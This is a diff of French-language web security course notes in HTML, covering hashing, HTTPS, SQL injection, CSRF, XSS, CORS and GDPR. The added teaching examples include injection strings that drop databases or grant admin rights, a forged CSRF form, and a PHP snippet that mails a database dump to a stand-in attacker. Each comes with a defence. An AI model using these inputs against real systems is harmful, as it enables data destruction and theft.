@@ -34,6 +34,8 @@
   <div class="section" id="securite">
 <h1>Sécurité<a class="headerlink" href="#securite" title="Lien permanent vers ce titre">¶</a></h1>
 <p>Mega important</p>
+<div class="section" id="vos-idees">
+<h2>Vos idées ?<a class="headerlink" href="#vos-idees" title="Lien permanent vers ce titre">¶</a></h2>
 <ol class="simple">
 <li><p>prepare sql - injection sql</p></li>
 <li><p>validation formulaire front (expression rationnelles, type input…)</p></li>
@@ -51,6 +53,7 @@
 <li><p>xss : cross site scripting</p></li>
 <li><p>CORS : cross origin resource sharing</p></li>
 </ol>
+</div>
 <div class="section" id="chiffrement-hashage">
 <h2>Chiffrement / hashage<a class="headerlink" href="#chiffrement-hashage" title="Lien permanent vers ce titre">¶</a></h2>
 <div class="section" id="cryptage-decryptage-codage-decodage">
@@ -77,7 +80,7 @@
 <p>Pour les BDD de mots de passe, si j”utilisais du chiffrement, la récupération de la clé secrète permettrait d”avoir accès à la liste de tous les mots de passe en clair.</p>
 <div class="section" id="attaque-contre-la-base-hachee">
 <h4>Attaque contre la base hachée<a class="headerlink" href="#attaque-contre-la-base-hachee" title="Lien permanent vers ce titre">¶</a></h4>
-<p>Brute force: je calcule un tableau de correspondance entre tous les mots qui existent et les hash.</p>
+<p><strong>Brute force:</strong> je calcule un tableau de correspondance entre tous les mots qui existent et les hash.</p>
 <p>ex: azerty =&gt; ozhfloihdsfhfdvhvgfd</p>
 <p>On a eu qques années de protection, mais aujourd”hui on peut trouver des tableaux pré-calculés de hashs de mdp !</p>
 </div>
@@ -116,8 +119,21 @@
 <blockquote>
 <div><p>l”idée du https est de chiffrer le contenu de ta requete http ! comme si tu mettais dans ton enveloppe un message codé.</p>
 </div></blockquote>
+<div class="section" id="cle-publique-cle-privee">
+<h4>Clé publique / clé privée<a class="headerlink" href="#cle-publique-cle-privee" title="Lien permanent vers ce titre">¶</a></h4>
+<p>C”est une paire de secrets, ça s”appelle du chiffrement asymétrique !</p>
+<p>Grâce à des calculs mathématiques, je peux :</p>
+<ul class="simple">
+<li><p>chiffrer un message avec ma clé privée : seuls ceux qui ont la clé publique peuvent le déchiffrer (donc tout le monde) =&gt; ça prouve mon identité</p></li>
+<li><p>chiffrer un message avec ma clé publique : seuls ceux qui ont ma clé privée (moi) peuvent déchiffrer le message =&gt; confidentialité</p></li>
+</ul>
+<p>=&gt; tout repose sur la sécurité de la clé privée ! ne doit pas être accessible !</p>
+</div>
+<div class="section" id="demarche">
+<h4>Démarche<a class="headerlink" href="#demarche" title="Lien permanent vers ce titre">¶</a></h4>
 <ol class="simple">
 <li><p>le site me passe sa clé publique</p></li>
+<li><p>je demande à l”autorité de certification si la clé publique est bonne</p></li>
 <li><p>j”utilise sa clé pour chiffrer ma demande (et lui envoyer ma clé publique en meme temps)</p></li>
 <li><p>je lui envoie (et personne ne peut la lire)</p></li>
 <li><p>le site déchiffre ma demande etc. et me répond en chiffrant avec ma clé publique + sa clé privée !</p></li>
@@ -125,20 +141,176 @@
 <p>NB: pour vous : soit acheter un « certificat » à votre hébergeur (ovh, gandi…), soit utiliser letsencrypt.org qui fournit des certificats gratuits.</p>
 </div>
 </div>
+</div>
 <div class="section" id="injection-sql">
 <h2>Injection SQL<a class="headerlink" href="#injection-sql" title="Lien permanent vers ce titre">¶</a></h2>
+<p>Réussir à faire exécuter du SQL par le site ciblé (victime).</p>
+<ul class="simple">
+<li><p>je peux mettre ma requete SQL pirate dans l”url</p></li>
+<li><p>ou dans un formulaire</p></li>
+<li><p>…</p></li>
+</ul>
+<p>ex: formulaire de connexion</p>
+<ul class="simple">
+<li><p>login : “ »toto » OR 1=1 ;”</p></li>
+<li><p>password : « mdp »</p></li>
+</ul>
+<p>=&gt; que se passe-t-il dans mon back ?</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span>SELECT *
+FROM user 
+WHERE login = $login
+AND password = $password
+</pre></div>
 </div>
-<div class="section" id="csrf-cross-site-request-forgery">
-<h2>CSRF : Cross Site Request Forgery<a class="headerlink" href="#csrf-cross-site-request-forgery" title="Lien permanent vers ce titre">¶</a></h2>
+<p>Le problème il vient du fait que je prends la chaîne de l”utilisateur telle quelle dans ma requete SQL !</p>
+<p>Autres exemples :</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">login:</span> <span class="pre">&quot;&quot;;DELETE</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">user;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">login:</span> <span class="pre">&quot;&quot;;DROP</span> <span class="pre">DATABASE;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">login:</span> <span class="pre">&quot;&quot;;UPDATE</span> <span class="pre">user</span> <span class="pre">SET</span> <span class="pre">admin=1</span> <span class="pre">WHERE</span> <span class="pre">login=mon_login;</span></code></p></li>
+</ul>
+<div class="section" id="comment-on-se-protege">
+<h3>Comment on se protège ?<a class="headerlink" href="#comment-on-se-protege" title="Lien permanent vers ce titre">¶</a></h3>
+<p>=&gt; <strong>requêtes préparées</strong></p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span>
+<span class="k">FROM</span> <span class="k">user</span> 
+<span class="k">WHERE</span> <span class="n">login</span> <span class="o">=</span> <span class="p">:</span><span class="n">login</span>
+<span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="p">:</span><span class="n">password</span>
+</pre></div>
+</div>
+<p>Dans un premier temps, le SGBD écrit la requête correcte ! Puis il met dedans les variables <strong>qui ne peuvent plus influencer la requête</strong>. Donc il va chercher un login qui vaut “ » »;DROP DATABASE” au lieu de réécrire la requête.</p>
+<div class="section" id="sans-prepare">
+<h4>Sans prepare :<a class="headerlink" href="#sans-prepare" title="Lien permanent vers ce titre">¶</a></h4>
+<ol class="simple">
+<li><p>j”écris mes chaînes de caractères SQL</p></li>
+<li><p>je crée les requêtes associées</p></li>
+</ol>
+</div>
+<div class="section" id="avec-prepare">
+<h4>Avec prepare :<a class="headerlink" href="#avec-prepare" title="Lien permanent vers ce titre">¶</a></h4>
+<ol class="simple">
+<li><p>je crée la requête valide</p></li>
+<li><p>j”insère ma chaîne de caractère</p></li>
+</ol>
+</div>
+</div>
+</div>
+<div class="section" id="csrf-cross-site-request-forgery-ou-xsrf">
+<h2>CSRF : Cross Site Request Forgery (ou XSRF)<a class="headerlink" href="#csrf-cross-site-request-forgery-ou-xsrf" title="Lien permanent vers ce titre">¶</a></h2>
+<p>Un attaquant profite du fait que vous êtes loggé sur un site lambda, pour vous faire valider sur un site tiers un formulaire qui pointe vers le site lambda.</p>
+<div class="section" id="exemple">
+<h3>Exemple<a class="headerlink" href="#exemple" title="Lien permanent vers ce titre">¶</a></h3>
+<ol class="simple">
+<li><p>je suis loggé sur tradfast de raouf</p></li>
+<li><p>je vais sur petithackermalin.com dans un autre onglet</p></li>
+<li><p>sur « phm » il y a un formulaire bidon que je vais valider (il te promet un iphone 40 gratos)</p></li>
+<li><p>le form en question : <code class="docutils literal notranslate"><span class="pre">&lt;form</span> <span class="pre">action=&quot;tradfast.com/user/petithacker&quot;&gt;&lt;input</span> <span class="pre">name=&quot;admin&quot;</span> <span class="pre">value=&quot;1&quot;/&gt;&lt;/form&gt;</span></code> (et non pas un envoi d”iphone XXX)</p></li>
+<li><p>petithacker est maintenant admin sur le site de raouf, si l”utilisateur connecté en 1 avait les droits d”effectuer le POST du form.</p></li>
+</ol>
+</div>
+<div class="section" id="id1">
+<h3>Comment on se protège ?<a class="headerlink" href="#id1" title="Lien permanent vers ce titre">¶</a></h3>
+<p>Je dois m”assurer que le formulaire vient bien de chez moi !</p>
+<p>=&gt; j”ajoute un champ caché <strong>aléatoire</strong> !! genre un token (hash ou autre) et il faut le stocker en session pour comparer le token reçu et le token généré dans le formulaire (stocké donc).</p>
+<p>=&gt; <code class="docutils literal notranslate"><span class="pre">token</span> <span class="pre">csrf</span></code></p>
+</div>
 </div>
 <div class="section" id="xss-cross-site-scripting">
 <h2>XSS : Cross Site Scripting<a class="headerlink" href="#xss-cross-site-scripting" title="Lien permanent vers ce titre">¶</a></h2>
+<p>! nom un peu trop vague.</p>
+<div class="section" id="principe">
+<h3>Principe<a class="headerlink" href="#principe" title="Lien permanent vers ce titre">¶</a></h3>
+<p>Je crée un script (php, js, etc.) et je parviens à le faire exécuter par l”utilisateur que j”attaque.</p>
+</div>
+<div class="section" id="exemple-bien-standard">
+<h3>Exemple bien standard<a class="headerlink" href="#exemple-bien-standard" title="Lien permanent vers ce titre">¶</a></h3>
+<p>Je poste un commentaire dans un formulaire d”un forum :</p>
+<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;you have been pwnd&quot;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>L”utilisateur qui verra mon commentaire va déclencher l”alert !</p>
+<p>ou</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+  <span class="nv">$bdd</span> <span class="o">=</span> <span class="nx">BDD</span><span class="o">::</span><span class="na">connexion</span><span class="p">();</span>
+  <span class="k">new</span> <span class="nx">PHPMailer</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">send</span><span class="p">(</span><span class="s2">&quot;petithackermalin&quot;</span><span class="p">,</span><span class="nv">$bdd</span><span class="o">-&gt;</span><span class="na">dumpDatabase</span><span class="p">());</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</div>
+<p>ou j”ai uploadé un fichier php <code class="docutils literal notranslate"><span class="pre">image.png</span></code> et le php s”exécute quand j”affiche ma photo de profil…</p>
+</div>
+<div class="section" id="comment-je-me-protege">
+<h3>Comment je me protège ?<a class="headerlink" href="#comment-je-me-protege" title="Lien permanent vers ce titre">¶</a></h3>
+<blockquote>
+<div><p>En codant correctement !</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>empêcher les caractères spéciaux dans les champs texte (escape special chars…)</p></li>
+<li><p>en vérifiant le mime/type et extension des fichiers uploadés et en les renommant pour éviter leur exécution éventuelle</p></li>
+</ul>
+</div>
 </div>
 <div class="section" id="cors-cross-origin-resource-sharing">
 <h2>CORS : Cross Origin Resource Sharing<a class="headerlink" href="#cors-cross-origin-resource-sharing" title="Lien permanent vers ce titre">¶</a></h2>
+<blockquote>
+<div><p>! c”est une protection intégrée au navigateur, pas au serveur !</p>
+</div></blockquote>
+<p>Empêcher (ou autoriser) l”accès à certaines ressources par le navigateur.</p>
+<div class="section" id="id2">
+<h3>Exemple<a class="headerlink" href="#id2" title="Lien permanent vers ce titre">¶</a></h3>
+<p>Je veux que les requêtes vers « api.tourismeform.com » ne proviennent que du site « tourismeform.com ».</p>
+<p>Cela évite que quelqu”un essaie de récupérer des informations depuis un autre site. (genre si je suis sur <code class="docutils literal notranslate"><span class="pre">hackervaillant.com</span></code>)</p>
+<blockquote>
+<div><p>! cela ne marchera que si l”utilisateur utilise un navigateur récent. (si vous passez par curl, postman ou ie6 ce sera toujours possible)</p>
+</div></blockquote>
 </div>
-<div class="section" id="rgpd-reglement-general-de-protection-des-donnees-gdpr">
-<h2>RGPD : Règlement Général de Protection des Données (GDPR)<a class="headerlink" href="#rgpd-reglement-general-de-protection-des-donnees-gdpr" title="Lien permanent vers ce titre">¶</a></h2>
+<div class="section" id="nota-bene">
+<h3>Nota Bene<a class="headerlink" href="#nota-bene" title="Lien permanent vers ce titre">¶</a></h3>
+<p>C”est <code class="docutils literal notranslate"><span class="pre">api.tourismeform.com</span></code> qui indique au navigateur qui a le droit d”accéder à ses pages, et c”est le <em>navigateur</em> qui fait la vérification.</p>
+<p>C”est à vous, <em>développeur</em>, de bien paramétrer votre back pour autoriser les bons domaines à vous requêter.</p>
+</div>
+</div>
+<div class="section" id="rgpd-reglement-general-sur-la-protection-des-donnees-gdpr">
+<h2>RGPD : Règlement Général sur la Protection des Données (GDPR)<a class="headerlink" href="#rgpd-reglement-general-sur-la-protection-des-donnees-gdpr" title="Lien permanent vers ce titre">¶</a></h2>
+<blockquote>
+<div><p>C”est le truc qui va vous envoyer en prison (https://www.legalplace.fr/guides/rgpd-sanction/) si vous faites pas votre taf correctement.</p>
+</div></blockquote>
+<p>Règles à suivre pour la gestion des données de vos utilisateurs.</p>
+<ul class="simple">
+<li><p>hacher les mdp</p></li>
+<li><p>ne stocker <strong>que</strong> les données nécessaires au bon fonctionnement du site <strong>et</strong> pouvoir le prouver</p></li>
+<li><p>ne stocker aucune donnée « illégale » : orientation sexuelle, religion, information médicale etc. =&gt; nécessite une dérogation de la <strong>CNIL</strong> (Commission Nationale Informatique et Liberté)</p></li>
+<li><p>recueillir le consentement explicite et éclairé de l”utilisateur pour le traitement de ses données (pas de <code class="docutils literal notranslate"><span class="pre">opt-out</span></code> mais du <code class="docutils literal notranslate"><span class="pre">opt-in</span></code>) (cf: les cookies sur les sites)</p></li>
+<li><p>expliciter et publier les traitements de données</p></li>
+<li><p>il faut un responsable identifié pour la gestion des données, indépendant !</p></li>
+<li><p>portabilité des données : l”utilisateur peut demander la suppression de toutes ses données (exception: https://www.cnil.fr/fr/le-droit-leffacement-supprimer-vos-donnees-en-ligne, si obligations légales ou autres bonnes raisons), et l”export de toutes ses données pour les migrer vers un autre système (éventuellement)</p></li>
+<li><p>répondre &lt; 1 mois, ou 8j si donnée de santé</p></li>
+<li><p>valable aussi si vous êtes sous-traitant</p></li>
+<li><p>attention aux accès aux données par vos salariés : ne doit avoir accès que si besoin</p></li>
+<li><p>attention aux données <em>de vos salariés</em></p></li>
+<li><p>obligation de prévenir la cnil et les utilisateurs en cas de fuite de données</p></li>
+</ul>
+<p>https://www.cnil.fr/sites/default/files/atoms/files/bpi-cnil-rgpd_guide-tpe-pme.pdf</p>
+<p>cf campagne de pub de signal https://signal.org/blog/the-instagram-ads-you-will-never-see/ : on sait qui vous êtes même si vous bloquez la pub.</p>
+<div class="section" id="en-cas-d-infraction">
+<h3>En cas d”infraction<a class="headerlink" href="#en-cas-d-infraction" title="Lien permanent vers ce titre">¶</a></h3>
+<ul class="simple">
+<li><p>jusqu”à 4% (ou 20 millions €) du Chiffre d”Affaire mondial de l”entreprise (sachant que la marge des entreprises est en moyenne 30%, ça fait 1/6 minimum des bénéfices)</p></li>
+<li><p><a class="reference external" href="https://www.legalplace.fr/guides/rgpd-sanction/">prison and co</a></p></li>
+</ul>
+</div>
+</div>
+<div class="section" id="social-engineering">
+<h2>Social Engineering<a class="headerlink" href="#social-engineering" title="Lien permanent vers ce titre">¶</a></h2>
+<p>LE truc le plus utilisé pour le piratage !!</p>
+<blockquote>
+<div><p>=&gt; Faire très attention à qui on fait confiance.</p>
+</div></blockquote>
+<p>Il s”agit de faire grandir la confiance que les gens vous font, petit à petit.</p>
+<p>ex: assistante du pdg qui fait des virements en pensant que le pdg a demandé.</p>
+<div class="section" id="phishing">
+<h3>Phishing<a class="headerlink" href="#phishing" title="Lien permanent vers ce titre">¶</a></h3>
+<p>!!</p>
+</div>
 </div>
 </div>
 
